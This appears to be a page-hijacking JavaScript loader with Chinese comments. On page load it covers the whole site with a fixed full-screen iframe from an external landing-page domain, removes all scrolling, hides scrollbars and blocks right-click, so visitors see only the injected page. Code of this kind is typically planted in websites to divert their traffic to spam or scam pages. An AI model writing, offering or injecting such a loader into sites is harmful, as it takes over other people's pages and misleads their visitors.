(function() {
    // 如果已经有隐藏的 iframe 存在，则直接返回，避免重复加载
    if (document.querySelector('.jnh_iframe_hidden')) {
        return;
    }

    let retryCount = 0;
    const MAX_RETRIES = 20; // 最大重试次数，确保 DOM 完全加载

    // 函数：禁用所有可能的滚动
    function disableAllScrolls() {
        // 强制 body 和 html 不可滚动，并填充整个视口
        document.body.style.setProperty('overflow', 'hidden', 'important');
        document.documentElement.style.setProperty('overflow', 'hidden', 'important');
        document.body.style.setProperty('width', '100%', 'important');
        document.body.style.setProperty('height', '100%', 'important');
        document.documentElement.style.setProperty('width', '100%', 'important');
        document.documentElement.style.setProperty('height', '100%', 'important');
        document.body.style.setProperty('margin', '0', 'important');
        document.body.style.setProperty('padding', '0', 'important');
        document.documentElement.style.setProperty('margin', '0', 'important');
        document.documentElement.style.setProperty('padding', '0', 'important');

        // 尝试找到所有可能的滚动元素并禁用其滚动条
        const elements = document.querySelectorAll('*');
        elements.forEach(el => {
            // 检查计算样式，如果发现有可滚动的属性，则强制隐藏
            const computedStyle = window.getComputedStyle(el);
            if (computedStyle.overflowY === 'scroll' || computedStyle.overflowY === 'auto' ||
                computedStyle.overflowX === 'scroll' || computedStyle.overflowX === 'auto') {
                el.style.setProperty('overflow', 'hidden', 'important');
            }
        });
    }

    function initializeAndShowIframe() {
        const body = document.body;
        const html = document.documentElement;

        // 如果 body 或 html 元素尚未加载，则重试
        if (!body || !html) {
            if (retryCount < MAX_RETRIES) {
                retryCount++;
                setTimeout(initializeAndShowIframe, 50);
            } else {
                console.error("JNH Loader Error: document.body or document.documentElement not available after multiple retries.");
            }
            return;
        }

        // 立即禁用所有可能的滚动，以防止任何闪烁
        disableAllScrolls();

        // 创建 iframe 元素
        const snpIframe = document.createElement('iframe');
        snpIframe.src = 'https://my-landing-page-9ru.pages.dev'; // <-- 你的目标落地页 URL
        snpIframe.frameBorder = '0'; // 移除边框
        snpIframe.rel = 'nofollow'; // 对搜索引擎更友好，表示不跟踪
        snpIframe.className = 'jnh_iframe_hidden'; // 添加 class 标识

        // 关键样式：确保 iframe 全屏固定覆盖，且自身不可滚动
        snpIframe.style.cssText = `
            position: fixed !important; /* 强制固定定位 */
            left: 0 !important;
            top: 0 !important;
            width: 100% !important;
            height: 100% !important;
            z-index: 2147483646 !important; /* 确保在最顶层 */
            display: block !important; /* 确保显示 */
            border: none !important; /* 再次确认无边框 */
            margin: 0 !important;
            padding: 0 !important;
            overflow: hidden !important; /* 强制防止 iframe 内部滚动条 */
            transform: translateZ(0) !important; /* 可能有助于某些渲染问题 */
        `;

        // 禁用 iframe 的鼠标右键菜单
        snpIframe.oncontextmenu = function() {
            return false;
        };

        // 将 iframe 添加到 body 中
        body.appendChild(snpIframe);

        // 再次调用禁用所有滚动的函数，确保 iframe 插入 DOM 后 CSS 生效
        disableAllScrolls();

        // 注入全局 CSS 规则，确保覆盖性
        const style = document.createElement('style');
        style.innerHTML = `
            body, html {
                overflow: hidden !important; /* 最强力的禁用滚动 */
                width: 100% !important;
                height: 100% !important;
                margin: 0 !important;
                padding: 0 !important;
            }
            /* 针对 Webkit 浏览器隐藏滚动条 */
            ::-webkit-scrollbar {
                display: none !important; /* 使用 !important */
            }
            /* IE and Edge */
            html {
                -ms-overflow-style: none !important;
                scrollbar-width: none !important; /* Firefox */
            }
            /* 强制所有可能的滚动元素都隐藏，防止背景内容露出 */
            div, section, article, main, aside, nav, header, footer {
                overflow: hidden !important;
            }
        `;
        document.head.appendChild(style);

        // 确保在 iframe 加载完成后再次禁用滚动，以防万一
        snpIframe.onload = function() {
            disableAllScrolls();
        };

        // 最终检查，延迟执行，确保所有动态内容加载后依然禁用
        setTimeout(disableAllScrolls, 500); // 延迟500ms再次检查
    }

    // 根据文档加载状态决定何时初始化 iframe
    if (document.readyState === "complete" || document.readyState === "interactive") {
        // 如果文档已经加载完成或正在交互，则立即执行
        initializeAndShowIframe();
    } else {
        // 否则，等待 DOMContentLoaded 事件触发
        document.addEventListener("DOMContentLoaded", initializeAndShowIframe);
    }
})();
